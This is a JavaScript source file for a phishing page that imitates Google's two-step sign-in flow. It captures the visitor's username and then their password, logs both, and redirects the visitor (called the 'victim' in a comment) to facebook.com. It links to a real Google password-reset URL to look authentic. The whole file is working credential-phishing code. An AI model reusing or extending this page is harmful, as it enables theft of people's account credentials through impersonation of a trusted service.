let outline = document.querySelector('.input-container');
let input = document.querySelector('input');
let inputText = document.querySelector('.input-text');
let inputContainer = document.querySelector('.input-container');
let text1 = document.querySelector('.text1');
let text2 = document.querySelector('.text2');
let links = document.querySelectorAll('a');
let button = document.querySelector('button');
let signIn = document.querySelector('.sign-in');
let loginBox = document.querySelector('.login-box');
let user = '';
let password = '';
//Define url to redirect victim
let url = 'http://www.facebook.com';
input.addEventListener('focusin', () => {
	outline.style.border = '2px solid rgb(26, 115, 232)';
});
input.addEventListener('focusout', () => {
	if (input.value == '') outline.style.border = '1px solid rgba(32, 33, 36, 0.2)';
});

const nextForm = () => {
	inputContainer.style.transform = 'translateX(-4em)';
	text1.style.transform = 'translateX(-4em)';
	text2.style.transform = 'translateX(-4em)';
	signIn.style.transform = 'translateX(-4em)';
	button.style.transform = 'translateX(-4em)';
	links.forEach((link) => {
		link.style.transform = 'translateX(-4em)';
		link.style.opacity = '0';
		link.style.display = 'none';
	});
	inputContainer.style.opacity = '0';
	text1.style.opacity = '0';
	text2.style.opacity = '0';
	signIn.style.opacity = '0';
	button.style.opacity = '0';
};
function nextInput() {
	nextForm();
	user = input.value;
	console.log(user);

	input.textContent = 0;
	setTimeout(() => {
		loginBox.innerHTML = `<img class="logo" src="./logo.png" />
    <span class="sign-in">Welcome</span>
    <div class="user"><div class="user-logo-outline">${user[0].toUpperCase()}</div><span class="user-name">${user}</span><img class="d-arrow" src="./d_arrow.png"></div>
    <br /><br />
    <div class="input-container">
      <input class="email" type="password" required/>
      <div class="input-text">Enter your Password</div>
      <img class="hidePass" src="./hidePass.png">
    </div>

    <br />
    <div class="sub-container">
      <a href="https://accounts.google.com/signin/v2/challenge/pwd?service=CPanel&flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL=APDPHBAQbFJ3G4U6pCP1V9KkCE5ieDAAN-L41GGo3EN4I2eFAmxX4UdHTul-AIGS&cid=1&navigationDirection=forward">Forgot password?</a>
      <button onclick="login()">Next</button>
    </div>
    <br /><br /><br /><br /><br /><br />`;
	}, 100);
	setTimeout(() => {
		let visibility = document.querySelector('.hidePass');
		input = document.querySelector('input');
		outline = document.querySelector('.input-container');
		visibility.addEventListener('click', () => {
			input.style.width = '19em';
			if (input.type === 'password') input.type = 'text';
			else input.type = 'password';
		});
		input.addEventListener('focusin', () => {
			outline.style.border = '2px solid rgb(26, 115, 232)';
		});
		input.addEventListener('focusout', () => {
			if (input.value == '') outline.style.border = '1px solid rgba(32, 33, 36, 0.2)';
		});
	}, 500);
}
const login = () => {
	password = input.value;
	console.log(password);
	setTimeout(() => (window.location.href = url), 1000);
};
